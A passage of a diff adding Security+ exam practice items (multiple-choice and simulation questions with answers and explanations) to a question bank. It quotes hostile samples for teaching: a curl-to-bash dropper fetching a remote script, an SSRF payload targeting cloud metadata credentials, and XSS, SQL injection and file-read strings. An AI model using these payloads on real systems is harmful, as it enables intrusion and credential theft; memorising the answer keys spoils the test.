+      "exp": "ALE = SLE × ARO. First: SLE = Asset Value × Exposure Factor = £500,000 × 0.40 = £200,000. Then: ALE = SLE × ARO = £200,000 × 0.25 = £50,000. ALE represents the expected annual loss from this risk. This figure is used to justify security investments — a control costing less than £50,000/year that eliminates this risk is cost-effective."
+    },
+    {
+      "id": "m190",
+      "ch": "5",
+      "difficulty": "hard",
+      "topic": "Risk Management",
+      "q": "An organisation outsources its payroll processing to a third-party vendor. The vendor suffers a data breach exposing employee PII. The organisation faces regulatory fines. Which principle does this illustrate regarding third-party risk?",
+      "opts": [
+        "Organisations can transfer all legal liability to vendors through contracts",
+        "Organisations cannot fully transfer regulatory responsibility — they remain accountable for data they control, even when processed by third parties",
+        "The vendor is solely responsible for all consequences",
+        "Regulatory fines only apply to the party that was directly breached"
+      ],
+      "correct": 1,
+      "exp": "Regulatory responsibility cannot be fully outsourced. Under GDPR, the data controller (the organisation) remains accountable for the processing performed by data processors (vendors) on their behalf. Regulators hold the controller accountable for due diligence in vendor selection and ongoing oversight. Contractual liability (DPA/indemnities) addresses financial recovery from the vendor but does not shield the organisation from regulatory action."
+    },
+    {
+      "id": "m191",
+      "ch": "5",
+      "difficulty": "medium",
+      "topic": "Security Frameworks",
+      "q": "Which security framework provides a voluntary set of standards, guidelines, and best practices for managing cybersecurity risk, organised around five core functions: Identify, Protect, Detect, Respond, and Recover?",
+      "opts": [
+        "ISO 27001",
+        "PCI DSS",
+        "NIST Cybersecurity Framework (CSF)",
+        "SOC 2"
+      ],
+      "correct": 2,
+      "exp": "The NIST Cybersecurity Framework (CSF) is a voluntary risk-based framework organised around five functions: Identify (assets, risks), Protect (controls), Detect (monitoring), Respond (IR), Recover (resilience). ISO 27001 is an international standard for ISMS certification. PCI DSS is a mandatory industry standard for payment card environments. SOC 2 is an auditing framework for service organisations."
+    },
+    {
+      "id": "m192",
+      "ch": "5",
+      "difficulty": "hard",
+      "topic": "Governance & Compliance",
+      "q": "A company operates under both PCI DSS and HIPAA. A security consultant recommends a \"harmonised controls\" approach. What does this mean, and why is it beneficial?",
+      "opts": [
+        "Implementing only PCI DSS controls and ignoring HIPAA",
+        "Mapping overlapping controls across frameworks and implementing a single unified control that satisfies requirements from multiple frameworks simultaneously, reducing duplication and cost",
+        "Alternating compliance efforts between frameworks each year",
+        "Delegating one framework to IT and one to legal"
+      ],
+      "correct": 1,
+      "exp": "Control harmonisation identifies overlapping requirements across frameworks (e.g., both PCI DSS and HIPAA require access controls, encryption, and audit logs) and implements a single control that satisfies both. This reduces duplication, simplifies auditing, and lowers cost. NIST CSF or ISO 27001 are often used as common reference frameworks to map against multiple compliance requirements. Ignoring one framework creates regulatory exposure."
+    },
+    {
+      "id": "m193",
+      "ch": "5",
+      "difficulty": "easy",
+      "topic": "Data Privacy & Protection",
+      "q": "Which data classification label is typically assigned to information that, if disclosed, would cause serious harm to national security or the organisation, and is subject to the strictest handling requirements?",
+      "opts": [
+        "Public",
+        "Internal / Confidential",
+        "Restricted / Top Secret",
+        "Sensitive"
+      ],
+      "correct": 2,
+      "exp": "Restricted / Top Secret / Classified is the highest classification level, applied to information whose disclosure would cause the most severe harm. Handling requirements are most stringent: encryption mandatory, strict need-to-know access, formal approval for any access. Public information can be freely disclosed. Internal/Confidential is for general business-sensitive information. Classification labels vary by organisation and sector."
+    },
+    {
+      "id": "m194",
+      "ch": "5",
+      "difficulty": "easy",
+      "topic": "Security Awareness",
+      "q": "An organisation runs simulated phishing exercises and provides immediate training to employees who click the simulated link. What is the PRIMARY goal of this programme?",
+      "opts": [
+        "To identify which employees to terminate",
+        "To measure and reduce susceptibility to phishing through behavioural training",
+        "To fulfil a compliance checkbox requirement",
+        "To test the technical email filtering system"
+      ],
+      "correct": 1,
+      "exp": "The primary goal of phishing simulation programmes is to measure and reduce employee susceptibility through immediate, contextual training. The \"teachable moment\" delivered immediately after a click is most effective at changing behaviour. Metrics tracked: click rate, credential submission rate, report rate. Declining click rates over time indicate programme success. It is not a punitive programme nor primarily a technical test."
+    },
+    {
+      "id": "m195",
+      "ch": "5",
+      "difficulty": "medium",
+      "topic": "Security Frameworks",
+      "q": "A company undergoes an external audit confirming its information security management system meets ISO 27001 requirements. What is the OUTPUT of this process?",
+      "opts": [
+        "A penetration test report",
+        "ISO 27001 certification issued by an accredited certification body",
+        "A SOC 2 Type II report",
+        "A NIST CSF maturity score"
+      ],
+      "correct": 1,
+      "exp": "Successful completion of an ISO 27001 audit by an accredited certification body results in ISO 27001 certification — a formal, internationally recognised attestation that the organisation's ISMS meets the standard. This certification demonstrates due diligence to customers, regulators, and partners. A penetration test produces a report. SOC 2 is a separate auditing framework. NIST CSF produces a maturity profile, not a certification."
+    },
+    {
+      "id": "m196",
+      "ch": "5",
+      "difficulty": "medium",
+      "topic": "Risk Management",
+      "q": "A Business Impact Analysis (BIA) is being conducted. Which metric identifies the MAXIMUM tolerable period of disruption before a business function causes unacceptable harm?",
+      "opts": [
+        "Recovery Point Objective (RPO)",
+        "Maximum Tolerable Downtime (MTD) / Recovery Time Objective (RTO)",
+        "Mean Time Between Failures (MTBF)",
+        "Mean Time to Repair (MTTR)"
+      ],
+      "correct": 1,
+      "exp": "Maximum Tolerable Downtime (MTD) — sometimes equated with RTO in practice — defines the longest time a business process can be unavailable before the impact becomes unacceptable (financial loss, regulatory breach, reputational damage). RPO defines acceptable data loss (time since last backup). MTBF is the average time between hardware failures. MTTR is the average time to restore a failed system."
+    },
+    {
+      "id": "m197",
+      "ch": "5",
+      "difficulty": "hard",
+      "topic": "Governance & Compliance",
+      "q": "A penetration test report rates a vulnerability as \"Critical\" based on the tester's assessment, but the CVSS Base Score is only 5.2 (Medium). A manager argues the CVSS score should govern remediation priority. Who is correct, and why?",
+      "opts": [
+        "The manager is correct — CVSS Base Score is the definitive priority metric",
+        "The penetration tester is correct — CVSS Base Score measures theoretical severity in isolation; real-world context (chaining, business impact, exploitability in this environment) can legitimately elevate priority beyond the base score",
+        "Both are wrong — only regulatory requirements should govern priority",
+        "They are equally valid — use whichever is more convenient"
+      ],
+      "correct": 1,
+      "exp": "CVSS Base Score is not sufficient for prioritisation alone. It measures theoretical severity without environmental or business context. A penetration tester may rate a Medium CVSS finding as Critical if: (1) it chains with other findings to achieve full compromise, (2) the affected system is business-critical, or (3) active exploitation was demonstrated. Risk-based prioritisation combines CVSS with exploitability, business context, and attacker perspective."
+    },
+    {
+      "id": "m198",
+      "ch": "5",
+      "difficulty": "medium",
+      "topic": "Data Privacy & Protection",
+      "q": "An organisation wants to allow analysts to work with customer transaction data for analytics purposes without exposing real customer names, account numbers, or contact details. Which data protection technique BEST achieves this?",
+      "opts": [
+        "Encrypting the dataset with AES-256",
+        "Data anonymisation or pseudonymisation (replacing identifying fields with synthetic or tokenised values)",
+        "Password-protecting the spreadsheet",
+        "Restricting access to the database to two analysts"
+      ],
+      "correct": 1,
+      "exp": "Data anonymisation / pseudonymisation replaces or removes identifying information (names, account numbers, contact details) with synthetic values or tokens, allowing analytics to proceed on structurally similar data without exposing personal information. Encryption protects data in storage/transit but requires decryption to use. Password protection is weak. Access restriction reduces exposure but doesn't remove the risk if those two analysts' systems are compromised."
+    },
+    {
+      "id": "m199",
+      "ch": "5",
+      "difficulty": "hard",
+      "topic": "Security Awareness",
+      "q": "A CISO wants to measure whether the organisation's security awareness programme is achieving behavioural change, not just training completion. Which metric MOST effectively measures actual outcome rather than activity?",
+      "opts": [
+        "Percentage of employees who completed the annual training module",
+        "Reduction in phishing simulation click rate and increase in suspicious email report rate over successive quarters",
+        "Number of security policies updated this year",
+        "Total training hours logged per department"
+      ],
+      "correct": 1,
+      "exp": "Phishing simulation click rate reduction + suspicious email report rate increase are outcome metrics — they measure whether training is changing actual employee behaviour in real-world decision-making scenarios. Training completion, policy updates, and training hours are activity metrics that measure what was done, not whether it worked. Security+ and the CISM framework both emphasise measuring programme effectiveness through behavioural outcomes."
+    },
+    {
+      "id": "m200",
+      "ch": "5",
+      "difficulty": "hard",
+      "topic": "Security Frameworks",
+      "q": "An organisation's security policy states that \"all sensitive data must be encrypted at rest.\" The IT team interprets this differently — one team uses AES-128, another uses AES-256, and a third uses 3DES. Which governance document is MISSING that would resolve this inconsistency?",
+      "opts": [
+        "A more detailed security policy",
+        "A security standard specifying the minimum encryption algorithm and key length required",
+        "A security procedure for implementing encryption",
+        "A security guideline recommending encryption best practices"
+      ],
+      "correct": 1,
+      "exp": "A security standard defines specific mandatory technical requirements — e.g., \"all sensitive data at rest must be encrypted using AES-256 in GCM mode.\" Policies state what must be achieved; standards define precisely how. Without a standard, teams interpret policy differently, creating inconsistent and potentially inadequate controls. Procedures provide step-by-step implementation instructions. Guidelines are non-mandatory recommendations."
+    }
 ];
 
 // ═══════════════════════════════════════════════════════════════
@@ -2138,6 +3639,1741 @@ Certificate: RSA 2048-bit, SHA-256, expires in 90 days`,
     ],
     explanation:"SIEM/monitoring terminology: Honeynet = network of honeypots designed to study attacker behaviour after initial compromise. NetFlow = flow data without payload (lower storage, broad visibility). True Positive = real threat correctly detected. False Positive = benign activity incorrectly flagged (causes alert fatigue). UEBA = ML-based behavioural baseline modelling (detects impossible travel, unusual access hours, data staging) — goes beyond signature-based detection.",
     objective:"4.4"},
+  // ── Imported PBQs p051-p100 from secplus-pbq-50-new.html ──
+  {
+      "id": "p051",
+      "ch": "1",
+      "type": "TERMINAL SIM",
+      "emoji": "💻",
+      "difficulty": "medium",
+      "cat": "Cryptography",
+      "title": "Decode a Base64-encoded OpenSSL payload",
+      "scenario": "During a malware investigation, an analyst finds an encoded payload string embedded in a PowerShell script on a compromised host.",
+      "question": "Select the correct command to decode and decrypt the Base64-encoded AES-256-CBC encrypted file \"payload.enc\" using password \"S3cur3P@ss\".",
+      "explanation": "openssl enc -d = decrypt. -aes-256-cbc = cipher. -base64 = decode Base64 before decryption. -pass pass: = password. The decoded content is a classic dropper — piping a remote shell script to bash executes malware directly in memory without writing to disk (fileless execution). This is a core incident response skill for analysing suspicious encoded content.",
+      "hint": "Select the command that produces the secure result requested by the prompt.",
+      "answer": "analyst@ubuntu:~$ file payload.enc\npayload.enc: ASCII text\nanalyst@ubuntu:~$ head -3 payload.enc\nU2FsdGVkX1+ABcd1234...\n\nDECRYPTED CONTENT:\n#!/bin/bash\ncurl -s http://185.220.101.45/stage2.sh | bash\n# Fileless dropper — pipes remote script to bash\n[ALERT] C2 server identified: 185.220.101.45\n[MITRE] T1059.004 Unix Shell + T1105 Ingress Tool Transfer",
+      "choices": [
+        "openssl enc -d -aes-256-cbc -base64 -in payload.enc -pass pass:S3cur3P@ss",
+        "openssl genrsa -aes256 -out payload.key 2048",
+        "openssl dgst -sha256 payload.enc",
+        "openssl enc -e -aes-256-cbc -base64 -in payload.enc -out out.txt"
+      ],
+      "correct": 0
+    },
+    {
+      "id": "p052",
+      "ch": "1",
+      "type": "DRAG & DROP",
+      "emoji": "🔀",
+      "difficulty": "medium",
+      "cat": "PKI",
+      "title": "Match PKI components to their roles",
+      "scenario": "",
+      "question": "Match each PKI component to its correct function in a certificate infrastructure.",
+      "explanation": "Root CA: the trust anchor — kept offline in HSMs. If it signs intermediate CAs only, a compromised intermediate can be revoked without destroying all PKI trust. Intermediate CA: online, signs end-entity certs. CSR: applicant generates key pair locally, sends only the public key in the CSR — private key never leaves the applicant. OCSP: real-time per-certificate check. CRL: batch list, published periodically, can be stale between updates.",
+      "hint": "Drag each item to the target it best matches.",
+      "items": [
+        {
+          "id": "i0",
+          "label": "Root CA"
+        },
+        {
+          "id": "i1",
+          "label": "Intermediate CA"
+        },
+        {
+          "id": "i2",
+          "label": "Certificate Signing Request (CSR)"
+        },
+        {
+          "id": "i3",
+          "label": "OCSP Responder"
+        },
+        {
+          "id": "i4",
+          "label": "Certificate Revocation List (CRL)"
+        }
+      ],
+      "targets": [
+        {
+          "id": "t0",
+          "label": "Self-signed trust anchor kept offline — signs only intermediate CA certificates"
+        },
+        {
+          "id": "t1",
+          "label": "Online CA that signs end-entity certificates daily — can be revoked by Root CA if compromised"
+        },
+        {
+          "id": "t2",
+          "label": "Document containing the applicant's public key and identity, submitted to CA for signing"
+        },
+        {
+          "id": "t3",
+          "label": "Real-time certificate status service queried by clients to check if a specific cert is valid"
+        },
+        {
+          "id": "t4",
+          "label": "Periodically published list of revoked certificate serial numbers — not real-time"
+        }
+      ],
+      "correctMapping": {
+        "i0": "t0",
+        "i1": "t1",
+        "i2": "t2",
+        "i3": "t3",
+        "i4": "t4"
+      }
+    },
+    {
+      "id": "p053",
+      "ch": "1",
+      "type": "HOTSPOT",
+      "emoji": "📍",
+      "difficulty": "easy",
+      "cat": "Authentication",
+      "title": "Identify the strongest MFA option for admin accounts",
+      "scenario": "An organisation is selecting MFA for 50 privileged administrator accounts that access critical production systems.",
+      "question": "Which MFA method provides the STRONGEST protection against phishing and credential relay attacks?",
+      "explanation": "FIDO2/WebAuthn is the only phishing-resistant option. Origin binding means the cryptographic challenge/response includes the website domain — a phishing site on attacker.com receives a challenge that only works for attacker.com, not for company.com. The attacker cannot relay it. TOTP, SMS, and email OTPs can all be relayed in real time by a proxy phishing site that immediately forwards the code to the legitimate site before it expires. For privileged accounts, FIDO2 is the gold standard.",
+      "hint": "Choose the hotspot label that best answers the prompt.",
+      "diagram": "1. FIDO2 hardware security key (YubiKey) - Public-key cryptography with origin binding. Private key never leaves the device. Cryptographic assertion is domain-specific — a phishing site on a different domain cannot obtain a valid response.\n2. TOTP authenticator app (6-digit code) - Time-based code rotating every 30 seconds. Shared secret on server and device. Codes can be relayed in real-time by a phishing proxy sitting between victim and legitimate site.\n3. SMS OTP sent to registered phone - 6-digit code via text message. Vulnerable to SIM swapping, SS7 interception, and real-time phishing relay. NIST SP 800-63B deprecated SMS as a second factor.\n4. Email OTP to corporate email account - 6-digit code via email. Security depends on email account protection. Weakest option — if email is compromised, MFA is bypassed.",
+      "choices": [
+        "FIDO2 hardware security key (YubiKey)",
+        "TOTP authenticator app (6-digit code)",
+        "SMS OTP sent to registered phone",
+        "Email OTP to corporate email account"
+      ],
+      "correct": 0
+    },
+    {
+      "id": "p054",
+      "ch": "1",
+      "type": "FILL BLANK",
+      "emoji": "✏️",
+      "difficulty": "hard",
+      "cat": "Cryptography",
+      "title": "Complete the cryptographic key management terminology",
+      "scenario": "",
+      "question": "Fill in the correct term for each key management concept.",
+      "explanation": "HSM: the gold standard for key protection — used by CAs, banks, and government. Keys generated inside never leave in plaintext. Key wrapping: RSA public key wraps AES session key — recipient uses RSA private key to unwrap. Used in PKCS#7, CMS envelopes, and hybrid encryption. Key derivation (KDF): PBKDF2 applies HMAC thousands of times; bcrypt/Argon2 use memory-hard functions. The salt prevents rainbow tables; the iterations prevent brute-force. All three are heavily tested in Security+.",
+      "hint": "Fill each blank with the most accurate security term.",
+      "blanks": [
+        {
+          "id": "b0",
+          "sentence": "A ___ is a tamper-resistant hardware device that generates, stores, and performs cryptographic operations with private keys — the keys never exist in plaintext outside the device.",
+          "answer": "Hardware Security Module (HSM)",
+          "hint": "Key Management Server, Hardware Security Module (HSM), Trusted Platform Module (TPM), Key Escrow System"
+        },
+        {
+          "id": "b1",
+          "sentence": "___ is the process of encrypting one key with another key for secure storage or transmission — commonly used to protect symmetric keys by wrapping them with an asymmetric public key.",
+          "answer": "Key wrapping",
+          "hint": "Key stretching, Key wrapping, Key derivation, Key rotation"
+        },
+        {
+          "id": "b2",
+          "sentence": "___ uses a slow, salted hash function (PBKDF2, bcrypt, Argon2) applied many times to derive a cryptographic key from a password — deliberately slow to resist brute-force attacks.",
+          "answer": "Key derivation",
+          "hint": "Key wrapping, Key escrow, Key derivation, Key rotation"
+        }
+      ]
+    },
+    {
+      "id": "p055",
+      "ch": "1",
+      "type": "ORDERING",
+      "emoji": "📋",
+      "difficulty": "easy",
+      "cat": "Security Controls",
+      "title": "Order physical security controls by their layer (outermost first)",
+      "scenario": "",
+      "question": "Order these physical security controls from the OUTERMOST perimeter layer to the INNERMOST (most sensitive area).",
+      "explanation": "Physical security follows the defence-in-depth onion model — outermost to innermost: (1) Perimeter fencing + CCTV: building exterior. (2) Security guard lobby: first human checkpoint. (3) Mantrap at data centre entrance: prevents tailgating into the facility. (4) Biometric reader: controls access to the most sensitive room within the facility. (5) Server rack locks: innermost — individual equipment protection. Each layer slows attackers and provides a detection/deterrence opportunity.",
+      "hint": "Place the steps in the most secure operational order.",
+      "items": [
+        {
+          "id": "o0",
+          "label": "Server rack locks preventing access to individual servers"
+        },
+        {
+          "id": "o1",
+          "label": "CCTV and perimeter fencing around the building exterior"
+        },
+        {
+          "id": "o2",
+          "label": "Mantrap with badge reader at the data centre entrance"
+        },
+        {
+          "id": "o3",
+          "label": "Biometric reader at the secure operations room door"
+        },
+        {
+          "id": "o4",
+          "label": "Security guard desk in the building lobby"
+        }
+      ],
+      "correctOrder": [
+        "o1",
+        "o4",
+        "o2",
+        "o3",
+        "o0"
+      ]
+    },
+    {
+      "id": "p056",
+      "ch": "1",
+      "type": "DRAG & DROP",
+      "emoji": "🔀",
+      "difficulty": "medium",
+      "cat": "Security Principles",
+      "title": "Match access control models to their defining characteristics",
+      "scenario": "",
+      "question": "Match each access control model to its DEFINING characteristic.",
+      "explanation": "DAC: owners control access — Windows NTFS file permissions are DAC. MAC: system enforces — Bell-LaPadula model (no read up, no write down). RBAC: roles abstract permissions — Engineer role has certain access, not tied to individual. ABAC: policy language evaluates attributes (user clearance level, object sensitivity, time of day, location) — Zero Trust architectures use ABAC. Rule-based: static rules applied by admin — ACLs and time-based restrictions.",
+      "hint": "Drag each item to the target it best matches.",
+      "items": [
+        {
+          "id": "i0",
+          "label": "DAC (Discretionary Access Control)"
+        },
+        {
+          "id": "i1",
+          "label": "MAC (Mandatory Access Control)"
+        },
+        {
+          "id": "i2",
+          "label": "RBAC (Role-Based Access Control)"
+        },
+        {
+          "id": "i3",
+          "label": "ABAC (Attribute-Based Access Control)"
+        },
+        {
+          "id": "i4",
+          "label": "Rule-Based Access Control"
+        }
+      ],
+      "targets": [
+        {
+          "id": "t0",
+          "label": "Resource OWNER decides who can access — most flexible, least secure (e.g., standard file system permissions)"
+        },
+        {
+          "id": "t1",
+          "label": "Operating system enforces access based on classification labels — users cannot override (e.g., military systems, SELinux)"
+        },
+        {
+          "id": "t2",
+          "label": "Permissions assigned to ROLES, users assigned to roles — most common enterprise IAM model"
+        },
+        {
+          "id": "t3",
+          "label": "Access decisions based on subject, object, and environment attributes evaluated against policies — most flexible model"
+        },
+        {
+          "id": "t4",
+          "label": "Access controlled by administrator-defined rules (e.g., firewall ACLs, time-of-day restrictions)"
+        }
+      ],
+      "correctMapping": {
+        "i0": "t0",
+        "i1": "t1",
+        "i2": "t2",
+        "i3": "t3",
+        "i4": "t4"
+      }
+    },
+    {
+      "id": "p057",
+      "ch": "1",
+      "type": "TERMINAL SIM",
+      "emoji": "💻",
+      "difficulty": "hard",
+      "cat": "Cryptography",
+      "title": "Verify digital signature integrity with GPG",
+      "scenario": "A security engineer receives a software package with a detached GPG signature. They need to verify the package authenticity before deployment.",
+      "question": "Select the correct GPG command to verify the detached signature \"package.tar.gz.sig\" against \"package.tar.gz\" after importing the vendor's public key.",
+      "explanation": "gpg --verify signature_file data_file verifies a detached signature. The workflow: (1) Import vendor public key (done). (2) Verify: GPG uses the public key to verify the signature — confirming both the package is unmodified (integrity) and it was signed by the vendor's private key (authenticity/non-repudiation). Critical: always verify the key fingerprint via a second channel (vendor website, phone) — importing a wrong public key defeats the purpose.",
+      "hint": "Select the command that produces the secure result requested by the prompt.",
+      "answer": "engineer@server:~$ # Files received:\n# package.tar.gz (software package)\n# package.tar.gz.sig (detached signature)\n# vendor-pubkey.asc (vendor public key)\nengineer@server:~$ gpg --import vendor-pubkey.asc\ngpg: key ABC12345: public key \"Vendor Corp \" imported\n\ngpg: Signature made Mon 15 Apr 2024 09:00:00 UTC\ngpg:                using RSA key ABC12345\ngpg: Good signature from \"Vendor Corp \" [full]\nPrimary key fingerprint: ABCD 1234 EFGH 5678 IJKL  9012 MNOP 3456\n[VERIFIED] Package integrity and authenticity confirmed\n[NOTE] Always verify fingerprint out-of-band with vendor website",
+      "choices": [
+        "gpg --verify package.tar.gz.sig package.tar.gz",
+        "gpg --encrypt --recipient security@vendor.com package.tar.gz",
+        "gpg --sign package.tar.gz",
+        "gpg --decrypt package.tar.gz > output.tar.gz"
+      ],
+      "correct": 0
+    },
+    {
+      "id": "p058",
+      "ch": "1",
+      "type": "CONFIG/ACL",
+      "emoji": "⚙️",
+      "difficulty": "medium",
+      "cat": "Authentication",
+      "title": "Evaluate an Active Directory password policy against NIST SP 800-63B",
+      "scenario": "Review an Active Directory password policy and determine if each setting aligns with NIST SP 800-63B current guidance.",
+      "question": "12 character minimum — meets NIST guidance?",
+      "explanation": "NIST SP 800-63B (2017, updated 2024) reversed traditional guidance: 90-day rotation: DEPRECATED — causes predictable patterns (Password1→Password2). Change only on evidence of compromise. Complexity rules: DEPRECATED — creates weak patterns (P@ssw0rd!). Focus on length instead. Breach screening: STRONGLY RECOMMENDED — block passwords in known breach lists (HaveIBeenPwned API). Security questions: DEPRECATED — answers are guessable or findable on social media. Use out-of-band verification instead. 12-char minimum: NIST recommends at least 8, but 12+ is best practice.",
+      "hint": "Compare the existing rule set with least privilege and the requested business outcome.",
+      "currentConfig": "Setting | Configured Value | NIST 800-63B Aligned?\n1. Minimum password length | 12 characters minimum | Length | ?\n2. Mandatory 90-day expiry | Force change every 90 days | Rotation | ?\n3. Complexity rules | Must include uppercase, number, symbol | Complexity | ?\n4. Breach password screening | New passwords checked against known breach list | Screening | ?\n5. Password hints | Security questions allowed as account recovery | Recovery | ?",
+      "choices": [
+        "COMPLIANT",
+        "NON-COMPLIANT"
+      ],
+      "correct": 0
+    },
+    {
+      "id": "p059",
+      "ch": "1",
+      "type": "LOG ANALYSIS",
+      "emoji": "📊",
+      "difficulty": "hard",
+      "cat": "PKI",
+      "title": "Identify the certificate chain issue from TLS scan output",
+      "scenario": "A security scanner reports TLS configuration details for a payment portal.",
+      "question": "Which finding is supported by the log data?",
+      "explanation": "Two issues identified: (1) Incomplete chain: the server is only sending its own certificate, not the intermediate CA. Fix: concatenate the server cert and intermediate CA cert in the certificate file (e.g., Apache SSLCertificateChainFile or Nginx ssl_certificate with full chain). Clients that haven't cached the intermediate will see warnings. (2) OCSP Stapling not configured: without stapling, clients must contact the CA's OCSP server directly — slower, adds latency, and reveals browsing behaviour to the CA. TLS 1.3 is correct (do not downgrade). 5-year certs are non-compliant with CA/Browser Forum rules (max 1 year).",
+      "hint": "Look for the event, timestamp, source, and outcome that prove the finding.",
+      "logData": "TLS Scan Results — payments.company.com\n====================================\nProtocol: TLSv1.3\nCipher: TLS_AES_256_GCM_SHA384\n\nCertificate chain:\n  [0] payments.company.com\n      Issuer: Intermediate CA — Company Corp\n      Valid: 2024-01-01 to 2025-01-01\n      SAN: payments.company.com, www.payments.company.com\n\n  [1] Missing — server is not sending intermediate CA certificate\n\nChain validation: FAIL — unable to verify issuer certificate\nBrowser behaviour: Warning shown to users without cached intermediate\n\nHTSP header: present (max-age=31536000)\nOCSP Stapling: not configured",
+      "choices": [
+        "Configure the web server to send the full certificate chain (server cert + intermediate CA cert concatenated) to fix the incomplete chain",
+        "Enable OCSP Stapling so the server periodically fetches and caches the OCSP response, including it in the TLS handshake for better revocation performance and privacy",
+        "Upgrade from TLS 1.3 to TLS 1.2 — TLS 1.2 handles incomplete chains better",
+        "Extend the certificate validity period to 5 years to reduce renewal overhead"
+      ],
+      "correct": 0
+    },
+    {
+      "id": "p060",
+      "ch": "1",
+      "type": "HOTSPOT",
+      "emoji": "📍",
+      "difficulty": "medium",
+      "cat": "Security Controls",
+      "title": "Identify the correct control type for each scenario",
+      "scenario": "A security architect reviews four planned controls. Identify which control is MISCLASSIFIED.",
+      "question": "Which control is INCORRECTLY classified by the architect?",
+      "explanation": "Restoring from backup after ransomware is a CORRECTIVE control, not preventive. Backups do not prevent the ransomware attack — they correct/recover from it after it occurs. Having backups does not stop the encryption from happening. Preventive controls stop incidents (firewall, encryption, access controls). Detective controls identify incidents (IDS, SIEM, audit logs). Corrective controls restore to a known good state after an incident (restore from backup, re-imaging, patching after exploitation). Compensating controls substitute for another control that cannot be applied.",
+      "hint": "Choose the hotspot label that best answers the prompt.",
+      "diagram": "1. Firewall blocking inbound Telnet (port 23) → classified as Preventive - Correct — the firewall actively blocks the connection before it occurs. Preventive controls stop incidents from happening.\n2. IDS alerting on port scan activity → classified as Detective - Correct — the IDS identifies and reports suspicious activity. Detective controls discover incidents that have occurred or are in progress.\n3. Restoring encrypted files from backup after ransomware → classified as Preventive - The architect says: \"Backups prevent data loss, so they are preventive controls.\"\n4. Encrypting sensitive data at rest → classified as Preventive - Correct — encryption prevents unauthorised users from reading data even if they gain physical access. Preventive control.",
+      "choices": [
+        "Firewall blocking inbound Telnet (port 23) → classified as Preventive",
+        "IDS alerting on port scan activity → classified as Detective",
+        "Restoring encrypted files from backup after ransomware → classified as Preventive",
+        "Encrypting sensitive data at rest → classified as Preventive"
+      ],
+      "correct": 2
+    },
+    {
+      "id": "p061",
+      "ch": "2",
+      "type": "DRAG & DROP",
+      "emoji": "🔀",
+      "difficulty": "easy",
+      "cat": "Social Engineering",
+      "title": "Match social engineering techniques to their delivery method",
+      "scenario": "",
+      "question": "Match each social engineering technique to its PRIMARY delivery method.",
+      "explanation": "Phishing: bulk email. Vishing: voice/phone. Smishing: SMS. Spear phishing: targeted email using OSINT (LinkedIn research, public records). Watering hole: attacker compromises a legitimate industry website (trade publication, supplier portal) knowing the target group visits it — malware delivered automatically on visit. Watering holes are passive (victim comes to the attacker) unlike phishing (attacker goes to victim). APTs commonly use watering holes to target specific industries.",
+      "hint": "Drag each item to the target it best matches.",
+      "items": [
+        {
+          "id": "i0",
+          "label": "Phishing"
+        },
+        {
+          "id": "i1",
+          "label": "Vishing"
+        },
+        {
+          "id": "i2",
+          "label": "Smishing"
+        },
+        {
+          "id": "i3",
+          "label": "Spear phishing"
+        },
+        {
+          "id": "i4",
+          "label": "Watering hole attack"
+        }
+      ],
+      "targets": [
+        {
+          "id": "t0",
+          "label": "Mass fraudulent email impersonating trusted entity — sent to large recipient lists"
+        },
+        {
+          "id": "t1",
+          "label": "Voice call impersonating IT support, bank, or authority figure to extract information"
+        },
+        {
+          "id": "t2",
+          "label": "SMS text message containing malicious link or urgent request"
+        },
+        {
+          "id": "t3",
+          "label": "Highly targeted email personalised with OSINT about the specific victim and their contacts"
+        },
+        {
+          "id": "t4",
+          "label": "Compromising a legitimate website frequented by the target group — infects visitors silently"
+        }
+      ],
+      "correctMapping": {
+        "i0": "t0",
+        "i1": "t1",
+        "i2": "t2",
+        "i3": "t3",
+        "i4": "t4"
+      }
+    },
+    {
+      "id": "p062",
+      "ch": "2",
+      "type": "TERMINAL SIM",
+      "emoji": "💻",
+      "difficulty": "medium",
+      "cat": "Vulnerability Types",
+      "title": "Identify and test for SSRF vulnerability",
+      "scenario": "A bug bounty hunter is testing a web application that fetches metadata for URLs submitted by users.",
+      "question": "Which request BEST demonstrates a Server-Side Request Forgery (SSRF) attack against an AWS EC2 instance?",
+      "explanation": "SSRF against AWS IMDS (169.254.169.254) is one of the most impactful cloud vulnerabilities. The application fetches the URL server-side — the attacker redirects it to the instance metadata service which returns temporary IAM credentials. IMDSv2 mitigation: requires a PUT request to create a session token before GET requests — simple HTTP GET SSRF attacks are blocked. Application-level mitigations: validate/allowlist URLs, block private IP ranges (10.x, 172.16.x, 192.168.x, 169.254.x), and disable URL schemes except https.",
+      "hint": "Select the command that produces the secure result requested by the prompt.",
+      "answer": "Target: https://app.company.com/api/fetch-preview\nFunction: Fetches URL metadata (title, description) for link previews\nPOST /api/fetch-preview HTTP/1.1\nContent-Type: application/json\n{\"url\": \"https://example.com\"}  ← normal usage\n\nHTTP/1.1 200 OK\n{\n  \"metadata\": {\n    \"AWS_ACCESS_KEY_ID\": \"ASIA1234567890ABCDEF\",\n    \"AWS_SECRET_ACCESS_KEY\": \"abc123def456...\",\n    \"AWS_SESSION_TOKEN\": \"IQoJb3JpZ2l...\",\n    \"Expiration\": \"2024-04-01T06:14:12Z\"\n  }\n}\n[CRITICAL] Temporary IAM credentials exposed!\n[IMPACT] Attacker has EC2 instance role permissions\n[MITIGATIONS]\n  → Enforce IMDSv2 (session-oriented — blocks simple SSRF)\n  → Block 169.254.169.254 in application-level egress\n  → Implement SSRF-safe URL validation (allowlist, block private IPs)",
+      "choices": [
+        "{\"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}",
+        "{\"url\": \"javascript:alert(document.cookie)\"}",
+        "{\"url\": \"https://example.com/' OR 1=1 --\"}",
+        "{\"url\": \"file:///etc/passwd\"}"
+      ],
+      "correct": 0
+    },
+    {
+      "id": "p063",
+      "ch": "2",
+      "type": "LOG ANALYSIS",
+      "emoji": "📊",
+      "difficulty": "hard",
+      "cat": "Threats",
+      "title": "Analyse process tree for process injection indicators",
+      "scenario": "An EDR captures the following process tree on a compromised endpoint at 03:22 AM.",
+      "question": "Which finding is supported by the log data?",
+      "explanation": "PID 3801: Legitimate svchost.exe ONLY runs from C:\\Windows\\System32\\. A svchost.exe in C:\\Users\\Public\\ is a malicious binary masquerading as a Windows process (T1036 — Masquerading) + the 128MB/s outbound to a known TOR-adjacent IP confirms active C2/exfiltration. PID 4910: notepad.exe spawned from powershell.exe is anomalous (notepad is a text editor, should be launched by a user double-clicking a file) — suggests process hollowing (legitimate notepad process hollowed out and replaced with malicious code) or code injection into notepad. Both are T1055 (Process Injection) indicators.",
+      "hint": "Look for the event, timestamp, source, and outcome that prove the finding.",
